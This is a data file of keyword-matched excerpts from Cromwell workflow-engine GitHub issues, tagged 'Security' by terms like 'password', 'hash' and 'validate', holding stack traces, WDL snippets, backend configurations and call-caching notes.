java.net.SocketOutputStream.socketWrite(SocketOutputStream.java:109); 	at java.net.SocketOutputStream.write(SocketOutputStream.java:153),MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2183:5550,secur,security,5550,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2183,1,['secur'],['security']
Security," # Funcotator inputs; Boolean? run_funcotator; String? sequencing_center; String? sequence_source; String? funco_reference_version; String? funco_output_format; Boolean? funco_compress; Boolean? funco_use_gnomad_AF; File? funco_data_sources_tar_gz; String? funco_transcript_selection_mode; File? funco_transcript_selection_list; Array[String]? funco_annotation_defaults; Array[String]? funco_annotation_overrides; Array[String]? funcotator_excluded_fields; Boolean? funco_filter_funcotations; String? funcotator_extra_args. String funco_default_output_format = ""MAF""; ; # Use as a last resort to increase the disk given to every task in case of ill behaving data; Int? emergency_extra_disk; }. Int contig_size = select_first([min_contig_size, 1000000]); Int preemptible_or_default = select_first([preemptible, 2]); Int max_retries_or_default = select_first([max_retries, 2]). Runtime standard_runtime = {""gatk_docker"": gatk_docker, ""gatk_override"": gatk_override,; ""max_retries"": max_retries_or_default, ""preemptible"": preemptible_or_default, ""cpu"": small_task_cpu,; ""machine_mem"": small_task_mem * 1000, ""command_mem"": small_task_mem * 1000 - 500,; ""disk"": small_task_disk, ""boot_disk_size"": boot_disk_size}. scatter (normal_bam in zip(normal_bams, normal_bais)) {; call m2.Mutect2 {; input:; intervals = intervals,; ref_fasta = ref_fasta,; ref_fai = ref_fai,; ref_dict = ref_dict,; tumor_reads = normal_bam.left,; tumor_reads_index = normal_bam.right,; scatter_count = scatter_count,; m2_extra_args = select_first([m2_extra_args, """"]) + ""--max-mnp-distance 0"",; gatk_override = gatk_override,; gatk_docker = gatk_docker,; preemptible = preemptible,; max_retries = max_retries,; pon = pon,; pon_idx = pon_idx,; gnomad = gnomad,; gnomad_idx = gnomad_idx; }; }. output {; Array[File] normal_calls = Mutect2.filtered_vcf; Array[File] normal_calls_idx = Mutect2.filtered_vcf_idx. }; }. ```; <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5347:6524,PASSWORD,PASSWORDS,6524,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5347,1,['PASSWORD'],['PASSWORDS']
Security," ###; ### You may need to create an account before you can view/create issues.; ###. <!--; Hi! Thanks for taking the time to report feedback. Before posting an issue over in Jira tracker, please check whether your question is already answered in our:; forum https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; documentation http://cromwell.readthedocs.io/en/develop/. Other forums:; FireCloud https://gatkforums.broadinstitute.org/firecloud/categories/ask-the-firecloud-team; WDL https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; CWL https://www.biostars.org/; -->. <!-- Are you seeing something that looks like a bug? Then great! You're almost in the right place. -->. <!-- You'll want to go to https://broadworkbench.atlassian.net/projects/BA/issues and then tell us: -->. <!-- Which backend are you running? -->. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->; ; Jobs which required gpuType: ""nvidia-tesla-t4"", nvidiaDriverVersion: ""418.40.04"", failed. Our pipeline backend is Google : genomics.googleapis.com; ""jes"": {; ""endpointUrl"": ""https://genomics.googleapis.com/"",; ""zone"": ""us-central1-f"",; ....; },. job runtimeAttributes:; ...; ""preemptible"": ""1"",; ""gpuCount"": ""1"",; ""failOnStderr"": ""false"",; ""bootDiskSizeGb"": ""70"",; ""disks"": ""local-disk 70 SSD"",; ""continueOnReturnCode"": ""0"",; ""gpuType"": ""nvidia-tesla-t4"",; ""nvidiaDriverVersion"": ""418.40.04"",; ""maxRetries"": ""0"",; ""cpu"": ""8"",; ""cpuMin"": ""1"",; ""noAddress"": ""false"",; ""zone"": ""us-central1-f"",; ""memoryMin"": ""2 GB"",; ""memory"": ""64 GB"". Jobs failed with following message:; ""Task wf_quip_lymphocyte_segmentation_incep_v01052021.quip_lymphocyte_segmentation:NA:1 failed. The job was stopped before the command finished. PAPI error code 2. Execution failed: generic::unknown: installing drivers: container exited with unexpected exit code 1: + COS_KERNEL_INFO_FILENAME=kernel_info\n+ C",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6195:1108,PASSWORD,PASSWORDS,1108,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6195,1,['PASSWORD'],['PASSWORDS']
Security," - Reading from cromwell.DATABASECHANGELOG; 2019-01-31 18:29:35,280 INFO - SELECT * FROM cromwell.DATABASECHANGELOG ORDER BY DATEEXECUTED ASC, ORDEREXECUTED ASC; 2019-01-31 18:29:35,282 INFO - SELECT COUNT(*) FROM cromwell.DATABASECHANGELOGLOCK; 2019-01-31 18:29:35,461 INFO - Successfully released change log lock; 2019-01-31 18:29:35,469 ERROR - Failed to instantiate Cromwell System. Shutting down Cromwell.; java.lang.ArrayIndexOutOfBoundsException: 1; 	at liquibase.datatype.DataTypeFactory.fromDescription(DataTypeFactory.java:251); 	at liquibase.change.core.CreateTableChange.generateStatements(CreateTableChange.java:70); 	at liquibase.change.AbstractChange.generateStatementsVolatile(AbstractChange.java:287); 	at liquibase.change.AbstractChange.warn(AbstractChange.java:358); 	at liquibase.changelog.visitor.ValidatingVisitor.visit(ValidatingVisitor.java:109); 	at liquibase.changelog.ChangeLogIterator.run(ChangeLogIterator.java:83); 	at liquibase.changelog.DatabaseChangeLog.validate(DatabaseChangeLog.java:269); 	at liquibase.Liquibase.update(Liquibase.java:198); 	at liquibase.Liquibase.update(Liquibase.java:179); 	at cromwell.database.migration.liquibase.LiquibaseUtils$.updateSchema(LiquibaseUtils.scala:62); 	at cromwell.database.migration.liquibase.LiquibaseUtils$.updateSchema(LiquibaseUtils.scala:34); 	at cromwell.services.ServicesStore$EnhancedSqlDatabase$.$anonfun$initialized$1(ServicesStore.scala:11); 	at cromwell.services.ServicesStore$EnhancedSqlDatabase$.$anonfun$initialized$1$adapted(ServicesStore.scala:11); 	at cromwell.database.slick.SlickDatabase.$anonfun$withConnection$1(SlickDatabase.scala:155); 	at slick.jdbc.SimpleJdbcAction.run(StreamingInvokerAction.scala:70); 	at slick.jdbc.SimpleJdbcAction.run(StreamingInvokerAction.scala:69); 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.liftedTree1$1(BasicBackend.scala:275); 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.run(BasicBackend.scala:275); 	at java.util.concurrent.ThreadPoolExecutor.runWorker(Thread",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4605:2857,validat,validate,2857,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4605,1,['validat'],['validate']
Security," . If I can get this working, I'll happily document and update the CallCaching documentation page with what I've found. ## Background information. Version: Cromwell-47. Documentation:; - https://cromwell.readthedocs.io/en/stable/cromwell_features/CallCaching/; - https://cromwell.readthedocs.io/en/stable/Configuring/#local-filesystem-options; - https://cromwell.readthedocs.io/en/stable/backends/HPC/#shared-filesystem. Cache duplication strategies:; - `hard-link`; - `soft-link` - This strategy is not applicable for tasks which specify a Docker image and will be ignored.; - `copy`; - ~`cached-copy`~ - This is non-cache duplication strategy. Cache hashing strategies:; - `file` - (default) computes an md5 hash of the file content. [Code: `tryWithResource(() => file.newInputStream) { DigestUtils.md5Hex }`]; - `path` - computes an md5 hash of the file path. This strategy will only be effective if the duplication-strategy (above) is set to ""soft-link"".; - `path+modtime` - compute an md5 hash of the file path and the last modified time. The same conditions as for ""path"" apply here. [Code: `md5Hex(file.toAbsolutePath.pathAsString + file.lastModifiedTime.toString)`]. Other caching options:. - `system.file-hash-cache` - Prevent repeatedly requesting the hashes of the same files multiple times. - `backend.providers.Local.caching.check-sibling-md5` - will check if a sibling file with the same name and the .md5 extension exists, and if it does, use the content of this file as a hash. ## My takeaway. - I can't use a `softlink` cache duplication strategy as it's not allowed for containers. - If I select the `path+modtime` hashing strategy, only the first task in a workflow will succeed, as the hard-link duplication strategy will cause the path ""absolute"" be different (causing a hash differential). ## Questions. - ~What defines a cache hit, or exactly which information is used to the call hash?~; > I'll answer this one myself, by looking at the metadata returned from `/api/workflows/{",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5346:1601,hash,hash,1601,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5346,1,['hash'],['hash']
Security," 16:15:32 GMT; Server: Docker Registry; X-XSS-Protection: 1; mode=block; X-Frame-Options: SAMEORIGIN; Alt-Svc: quic="":443""; ma=2592000; v=""41,39,38,37,35"". {; ""name"": ""unused"",; ""tag"": ""unused"",; ""architecture"": ""amd64"",; ""fsLayers"": [; {; ""blobSum"": ""sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4""; },; {; ""blobSum"": ""sha256:1c4816548d6a2a08f89c304bf09503e791a338c4be90629610152124c7285d3f""; }; ],; ""history"": [; {; ""v1Compatibility"": ""{\""architecture\"":\""amd64\"",\""config\"":{\""ArgsEscaped\"":true,\""AttachStderr\"":false,\""AttachStdin\"":false,\""AttachStdout\"":false,\""Cmd\"":[\""/bin/bash\""],\""Domainname\"":\""\"",\""Entrypoint\"":[],\""Env\"":[\""PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\""],\""ExposedPorts\"":{},\""Hostname\"":\""6f82340aefbb\"",\""Image\"":\""sha256:7e927fe855b39870a9d03f4c3f8ae4b764d5e6847cdd0b7cee4be942e1ccc871\"",\""Labels\"":{},\""MacAddress\"":\""\"",\""NetworkDisabled\"":false,\""OnBuild\"":[],\""OpenStdin\"":false,\""Shell\"":[],\""StdinOnce\"":false,\""StopSignal\"":\""\"",\""Tty\"":false,\""User\"":\""\"",\""Volumes\"":{},\""WorkingDir\"":\""\""},\""container\"":\""be8ce157bc5ce90906f21220f2fd1442baa95c7284eead432626d6f1b4ac182e\"",\""container_config\"":{\""ArgsEscaped\"":true,\""AttachStderr\"":false,\""AttachStdin\"":false,\""AttachStdout\"":false,\""Cmd\"":[\""/bin/sh\"",\""-c\"",\""#(nop) \"",\""CMD [\\\""/bin/bash\\\""]\""],\""Domainname\"":\""\"",\""Entrypoint\"":[],\""Env\"":[\""PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\""],\""ExposedPorts\"":{},\""Hostname\"":\""6f82340aefbb\"",\""Image\"":\""sha256:7e927fe855b39870a9d03f4c3f8ae4b764d5e6847cdd0b7cee4be942e1ccc871\"",\""Labels\"":{},\""MacAddress\"":\""\"",\""NetworkDisabled\"":false,\""OnBuild\"":[],\""OpenStdin\"":false,\""Shell\"":[],\""StdinOnce\"":false,\""StopSignal\"":\""\"",\""Tty\"":false,\""User\"":\""\"",\""Volumes\"":{},\""WorkingDir\"":\""\""},\""created\"":\""2017-08-07T23:50:27.564116691Z\"",\""docker_version\"":\""17.03.1-ce\"",\""id\"":\""0a8d1e311b7797cd62611f599600a2e4633e4a7d1df9c1119141bd99c4842beb\"",\""os\"":\""linux\"",\""parent\"":\""63",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2826:2465,Expose,ExposedPorts,2465,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2826,2,['Expose'],['ExposedPorts']
Security," ; /home/lichtens/eval-gatk-protected/scripts/crsp_validation/crsp_validation_gatkp_run_local_paths.json.final.json \; default_runtimes \; /home/lichtens/eval-gatk-protected/scripts/crsp_validation/crsp_validation_gatkp_run_local_paths.json.metadata.json; ```. Error message:. ```; [2016-09-21 17:51:25,15] [error] Expression evaluation failed due to wdl4s.WdlExpressionException: Cannot perform operation: WdlString(broadinstitute) / WdlString(gatk): WdlExpression((Subtract: lhs=(Divide: lhs=<string:1:1 identifier ""YnJvYWRpbnN0aXR1dGU="">, rhs=<string:1:16 identifier ""Z2F0aw=="">), rhs=<string:1:21 identifier ""cHJvdGVjdGVk"">)); java.lang.RuntimeException: Expression evaluation failed due to wdl4s.WdlExpressionException: Cannot perform operation: WdlString(broadinstitute) / WdlString(gatk): WdlExpression((Subtract: lhs=(Divide: lhs=<string:1:1 identifier ""YnJvYWRpbnN0aXR1dGU="">, rhs=<string:1:16 identifier ""Z2F0aw=="">), rhs=<string:1:21 identifier ""cHJvdGVjdGVk"">)); at cromwell.backend.validation.RuntimeAttributesValidation$class.validateOptionalExpression(RuntimeAttributesValidation.scala:319); at cromwell.backend.validation.RuntimeAttributesValidation$$anon$1.validateOptionalExpression(RuntimeAttributesValidation.scala:90); at cromwell.backend.sfs.SharedFileSystemInitializationActor$$anonfun$runtimeAttributeValidators$1$$anonfun$apply$1.apply(SharedFileSystemInitializationActor.scala:48); at cromwell.backend.sfs.SharedFileSystemInitializationActor$$anonfun$runtimeAttributeValidators$1$$anonfun$apply$1.apply(SharedFileSystemInitializationActor.scala:48); at cromwell.backend.BackendWorkflowInitializationActor$$anonfun$badRuntimeAttrsForTask$1$2.apply(BackendWorkflowInitializationActor.scala:141); at cromwell.backend.BackendWorkflowInitializationActor$$anonfun$badRuntimeAttrsForTask$1$2.apply(BackendWorkflowInitializationActor.scala:139); at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:245); at scala.collection.TraversableLike$$anonfun$map$1.a",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1465:1560,validat,validation,1560,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1465,1,['validat'],['validation']
Security," = GCPBATCH; providers {; GCPBATCH {; // life sciences; actor-factory = ""cromwell.backend.google.batch.GcpBatchBackendLifecycleActorFactory""; config {; ## Google project; project = ""$PROJECT"". ## Base bucket for workflow executions; root = ""$BUCKET""; name-for-call-caching-purposes: PAPI; #60000/min in google; ##genomics-api-queries-per-100-seconds = 90000; virtual-private-cloud {; network-name = ""$NET""; subnetwork-name = ""$SUBNET""; }; // Polling for completion backs-off gradually for slower-running jobs.; // This is the maximum polling interval (in seconds):; maximum-polling-interval = 600; 	 request-workers = 4; batch-timeout = 7 days; 	 # Emit a warning if jobs last longer than this amount of time. This might indicate that something got stuck in PAPI.; 	 slow-job-warning-time: 24 hours; genomics {; // A reference to an auth defined in the `google` stanza at the top. This auth is used to create; // Pipelines and manipulate auth JSONs.; auth = ""application-default""; compute-service-account = ""default""; # Restrict access to VM metadata. Useful in cases when untrusted containers are running under a service; # account not owned by the submitting user; restrict-metadata-access = false; ## Location; location = ""europe-west1"". ; }. filesystems {; gcs {; // A reference to a potentially different auth for manipulating files via engine functions.; auth = ""application-default""; project = ""$PROJECT""; caching {; # When a cache hit is found, the following duplication strategy will be followed to use the cached outputs; # Possible values: ""copy"", ""reference"". Defaults to ""copy""; # ""copy"": Copy the output files; # ""reference"": DO NOT copy the output files but point to the original output files instead.; # Will still make sure than all the original output files exist and are accessible before; # going forward with the cache hit.; duplication-strategy = ""reference""; }; }; }. default-runtime-attributes {; cpu: 1; failOnStderr: false; continueOnReturnCode: 0; memory: ""2 GB""; bootDiskS",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7356:10708,access,access,10708,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7356,1,['access'],['access']
Security, Call Caching: cache miss; Uncaught error from thread [cromwell-system-akka.actor.default-dispatcher-2676] shutting down JVM since 'akka.jvm-exit-on-fatal-error' is enabled for ActorSystem[cromwell-system]. **java.lang.OutOfMemoryError: Java heap space**; at java.util.Arrays.copyOfRange(Arrays.java:3664); at java.lang.String.<init>(String.java:207); at java.lang.StringBuilder.toString(StringBuilder.java:407); at scala.StringContext.standardInterpolator(StringContext.scala:128); at scala.StringContext.s(StringContext.scala:95); at cromwell.engine.workflow.WorkflowActor$$anonfun$34.apply(WorkflowActor.scala:885); at cromwell.engine.workflow.WorkflowActor$$anonfun$34.apply(WorkflowActor.scala:881); at scala.collection.TraversableOnce$$anonfun$foldLeft$1.apply(TraversableOnce.scala:155); at scala.collection.TraversableOnce$$anonfun$foldLeft$1.apply(TraversableOnce.scala:155); at scala.collection.immutable.HashMap$HashMap1.foreach(HashMap.scala:221); at scala.collection.immutable.HashMap$HashTrieMap.foreach(HashMap.scala:428); at scala.collection.immutable.HashMap$HashTrieMap.foreach(HashMap.scala:428); at scala.collection.immutable.HashMap$HashTrieMap.foreach(HashMap.scala:428); at scala.collection.TraversableOnce$class.foldLeft(TraversableOnce.scala:155); at scala.collection.AbstractTraversable.foldLeft(Traversable.scala:104); at cromwell.engine.workflow.WorkflowActor.cromwell$engine$workflow$WorkflowActor$$startRunnableCalls(WorkflowActor.scala:881); at cromwell.engine.workflow.WorkflowActor$$anonfun$2.applyOrElse(WorkflowActor.scala:532); at cromwell.engine.workflow.WorkflowActor$$anonfun$2.applyOrElse(WorkflowActor.scala:467); at scala.runtime.AbstractPartialFunction.apply(AbstractPartialFunction.scala:36); at akka.actor.FSM$class.processEvent(FSM.scala:604); at cromwell.engine.workflow.WorkflowActor.akka$actor$LoggingFSM$$super$processEvent(WorkflowActor.scala:236); at akka.actor.LoggingFSM$class.processEvent(FSM.scala:734); at cromwell.engine.workflow.WorkflowActo,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/695:10690,Hash,HashMap,10690,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/695,2,['Hash'],"['HashMap', 'HashTrieMap']"
Security," Docker); - Initial localisation strategy: `[hard-link, cached-copy]`; - Local SFS environment; - My input files can be fairly large (~250GB per Bam with up to 16 Bams). . If I can get this working, I'll happily document and update the CallCaching documentation page with what I've found. ## Background information. Version: Cromwell-47. Documentation:; - https://cromwell.readthedocs.io/en/stable/cromwell_features/CallCaching/; - https://cromwell.readthedocs.io/en/stable/Configuring/#local-filesystem-options; - https://cromwell.readthedocs.io/en/stable/backends/HPC/#shared-filesystem. Cache duplication strategies:; - `hard-link`; - `soft-link` - This strategy is not applicable for tasks which specify a Docker image and will be ignored.; - `copy`; - ~`cached-copy`~ - This is non-cache duplication strategy. Cache hashing strategies:; - `file` - (default) computes an md5 hash of the file content. [Code: `tryWithResource(() => file.newInputStream) { DigestUtils.md5Hex }`]; - `path` - computes an md5 hash of the file path. This strategy will only be effective if the duplication-strategy (above) is set to ""soft-link"".; - `path+modtime` - compute an md5 hash of the file path and the last modified time. The same conditions as for ""path"" apply here. [Code: `md5Hex(file.toAbsolutePath.pathAsString + file.lastModifiedTime.toString)`]. Other caching options:. - `system.file-hash-cache` - Prevent repeatedly requesting the hashes of the same files multiple times. - `backend.providers.Local.caching.check-sibling-md5` - will check if a sibling file with the same name and the .md5 extension exists, and if it does, use the content of this file as a hash. ## My takeaway. - I can't use a `softlink` cache duplication strategy as it's not allowed for containers. - If I select the `path+modtime` hashing strategy, only the first task in a workflow will succeed, as the hard-link duplication strategy will cause the path ""absolute"" be different (causing a hash differential). ## Questions. - ~Wha",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5346:1447,hash,hash,1447,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5346,1,['hash'],['hash']
Security," Writing new Docker configuration file; 2017/02/07 15:40:50 I: Pulling image ""leetl1220/m1:bs""; 2017/02/07 15:41:48 I: Pulled image ""leetl1220/m1:bs"" successfully.; 2017/02/07 15:41:48 I: Switching to status: localizing-files; 2017/02/07 15:41:48 I: Calling SetOperationStatus(localizing-files); 2017/02/07 15:41:48 I: SetOperationStatus(localizing-files) succeeded; 2017/02/07 15:41:48 I: Docker file /cromwell_root/exec.sh maps to host; location /mnt/local-disk/exec.sh.; 2017/02/07 15:41:48 I: Copying; gs://broad-dsde-methods/lichtens/cromwell-executions-test_dl_oxoq/bamsurgeon_workflow/f6f01c57-23e2-4d29-854a-0d39c11ff950/call-generate_true_positives/exec.sh; to /mnt/local-disk/exec.sh; 2017/02/07 15:41:48 I: Running command: sudo gsutil -q -m cp; gs://broad-dsde-methods/lichtens/cromwell-executions-test_dl_oxoq/bamsurgeon_workflow/f6f01c57-23e2-4d29-854a-0d39c11ff950/call-generate_true_positives/exec.sh; /mnt/local-disk/exec.sh; 2017/02/07 15:41:49 I: Docker file; /cromwell_root/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; maps to host location; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list.; 2017/02/07 15:41:49 I: Copying; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; to /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:41:49 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list;",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:1234,access,access,1234,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security," \""type\"": \""File\"",\n \""doc\"": \""Path to tumor bam file\\n\"",\n \""inputBinding\"": {\n \""prefix\"": \""-tumor_bam\""\n },\n \""secondaryFiles\"": [\n \"".bai\""\n ],\n \""id\"": \""#amber-3.3.cwl/tumor_bam\""\n },\n {\n \""type\"": \""boolean\"",\n \""doc\"": \""Flag to put AMBER into tumor only mode\\n\"",\n \""inputBinding\"": {\n \""prefix\"": \""-tumor_only\""\n },\n \""default\"": false,\n \""id\"": \""#amber-3.3.cwl/tumor_only\""\n },\n {\n \""type\"": \""int\"",\n \""doc\"": \""Min VAF in ref and alt in tumor only mode\\n\"",\n \""inputBinding\"": {\n \""prefix\"": \""-tumor_only_min_support\""\n },\n \""default\"": 2,\n \""id\"": \""#amber-3.3.cwl/tumor_only_min_support\""\n },\n {\n \""type\"": [\n \""null\"",\n \""float\""\n ],\n \""doc\"": \""Min support in ref and alt in tumor only mode\\n\"",\n \""inputBinding\"": {\n \""prefix\"": \""-tumor_only_min_vaf\""\n },\n \""default\"": 0.05,\n \""id\"": \""#amber-3.3.cwl/tumor_only_min_vaf\""\n },\n {\n \""type\"": [\n \""null\"",\n \""string\""\n ],\n \""doc\"": \""SAM validation strategy: STRICT, SILENT, LENIENT [STRICT]\\n\"",\n \""inputBinding\"": {\n \""prefix\"": \""-validation_stringency\""\n },\n \""default\"": \""STRICT\"",\n \""id\"": \""#amber-3.3.cwl/validation_stringency\""\n }\n ],\n \""outputs\"": [\n {\n \""type\"": \""Directory\"",\n \""outputBinding\"": {\n \""glob\"": \""$(inputs.output_dir)\""\n },\n \""id\"": \""#amber-3.3.cwl/outdir\""\n }\n ],\n \""id\"": \""#amber-3.3.cwl\""\n },\n {\n \""class\"": \""CommandLineTool\"",\n \""doc\"": \""Count bam lines determines the read depth ratios of the supplied tumor and reference genomes.\\n\\nCOBALT starts with the raw read counts per 1,000 base window\\nfor both normal and tumor samples by counting the number of alignment starts in the\\nrespective bam files with a mapping quality score of at least 10\\nthat is neither unmapped, duplicated, secondary, nor supplementary.\\nWindows with a GC content less than 0.2 or greater than 0.6 or with an average mappability below 0.85\\nare excluded from further analysis.\\n\\nNext we apply a GC normalization to calculate the rea",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5826:66782,validat,validation,66782,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5826,1,['validat'],['validation']
Security," `v2+json` hash available will run, but will always fail call caching. We currently request a ""v2+json"" Docker-Content-Digest for all GCR images. Recently, GCR [""correctly""](https://enterprise.google.com/supportcenter/managecases#Case/0016000000MNGDy/U-13919143) returns 404 when it doesn't actually have ""v2+json"" for the images. There does appear to be an alternative ""v1+prettyjws"" Docker-Content-Digest available for GCR images. (FYI there are a [number of search hits](https://www.google.com/search?q=Docker-Content-Digest) re: ""Docker-Content-Digest"", especially v1 vs. v2, etc.) It's likely that Google's ""correction"" mentioned above was to fix the server from returning the wrong ""v1"" hash when ""v2"" was requested-but-not-available. While cromwell only uses the headers via HTTP HEAD, the hashes in the headers and the contents of an HTTP GET _are_ different between v1 and v2. Google tech support have also mentioned that clients may request either hash type, submitting both `Accept` headers, and that one can read the `Content-Type` from the server to determine which `Docker-Content-Digest` was returned. Bodies reformatted by jq for readability:; ```bash; $ curl -i -s -H 'Accept: application/vnd.docker.distribution.manifest.v1+prettyjws' https://gcr.io/v2/google-containers/ubuntu-slim/manifests/0.14; HTTP/1.1 200 OK; Docker-Distribution-API-Version: registry/2.0; Content-Type: application/vnd.docker.distribution.manifest.v1+prettyjws; Content-Length: 2647; Docker-Content-Digest: sha256:781290a693dc805993b19b7b4c5be40f7688f595312646b926abe2baae2fa9ff; Date: Mon, 06 Nov 2017 16:15:32 GMT; Server: Docker Registry; X-XSS-Protection: 1; mode=block; X-Frame-Options: SAMEORIGIN; Alt-Svc: quic="":443""; ma=2592000; v=""41,39,38,37,35"". {; ""name"": ""unused"",; ""tag"": ""unused"",; ""architecture"": ""amd64"",; ""fsLayers"": [; {; ""blobSum"": ""sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4""; },; {; ""blobSum"": ""sha256:1c4816548d6a2a08f89c304bf09503e791a338c4be9062961015212",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2826:1093,hash,hash,1093,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2826,1,['hash'],['hash']
Security," `womtool validate` (and it validated fine on Terra with the automatic validation they do). But the job would run about halfway and then automatically switch to ""Aborting"" status with no explanation or error message. The workflow would eventually fail after a huge delay (about 22 hours), and there would be no real error message. All tasks that ran were successful (but not all tasks ran). # Minimal WDL example. Here is a working example:. ```wdl; version 1.0. workflow my_workflow {; call my_task; }. task my_task {; command {; echo ""hello world""; }; output {; File out = stdout(); }; }; ```. And here is a non-working example that still validates fine using `womtool validate`:. ```wdl; version 1.0. workflow my_workflow {; input {; Boolean run_task; }. if (run_task) {; call my_task; }. output {; File out = select_first([my_task.out, stdout()]); }; }. task my_task {; command {; echo ""hello world""; }; output {; File out = stdout(); }; }; ```. The above gives; ```console; (cromwell) [sfleming@laptop:~/cromwell]$ womtool validate test.wdl ; Success!; ```. # The problem. The problem is that the non-working WDL example above should not validate successfully, as it is NOT a valid WDL. The `stdout()` built-in inside the `select_first()` in the `output` block of the `workflow` is not actually allowed. It will cause a very bizarre error when this WDL is run. # What am I asking for?. 1. Fix `womtool validate` to catch these kinds of errors. Also happens with `stderr()`.; 2. Provide an actionable error message when this kind of edge case ends up being run by Cromwell. Right now it automatically moves to ""Aborting"" status with no error message at all. Very hard to diagnose!. # Other information. I found this error using `miniwdl check`, which correctly identified the error, just FYI. <!-- Which backend are you running? -->. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6976:1803,validat,validate,1803,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6976,3,"['PASSWORD', 'validat']","['PASSWORDS', 'validate']"
Security," a bug? Then great! You're almost in the right place. -->. <!-- You'll want to go to https://broadworkbench.atlassian.net/projects/BA/issues and then tell us: -->. <!-- Which backend are you running? -->; Our backend: ; GCP PAPIv2 ; actor-factory = ""cromwell.backend.google.pipelines.v2alpha1.PipelinesApiLifecycleActorFactory"". endpoint-url = ""https://genomics.googleapis.com/"". <!-- Paste/Attach your workflow if possible: -->; workflow runtime; runtime {; docker: ""us.gcr.io/cloudypipelines-com/til_segmentation:1.5""; bootDiskSizeGb: 70; disks: ""local-disk 70 SSD""; memory: ""52 GB""; cpu: ""8""; maxRetries: 1; gpuCount: 1; zones: ""us-east1-d us-east1-c us-central1-a us-central1-c us-west1-a us-west1-b""; ##gpuType: ""nvidia-tesla-k80""; gpuType: ""nvidia-tesla-t4""; nvidiaDriverVersion: ""418.40.04""; ##nvidiaDriverVersion: ""418.87.00""; ; }. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->; #### Recently, Our All workflows with GPU failed under the same configurations which most of workflows used to work on Cromwell 48, we updated to the latest Cromwell 52, still had the same errors, see belowL. 2020-08-04 23:44:00,228 cromwell-system-akka.dispatchers.engine-dispatcher-38 INFO - WorkflowManagerActor Workflow f1dca11c-ea29-48b1-9691-9f30c9e59154 failed (during ExecutingWorkflowState): java.lang.Exception: Task wf_quip_lymphocyte_segmentation_v03232020.quip_lymphocyte_segmentation:NA:2 failed. 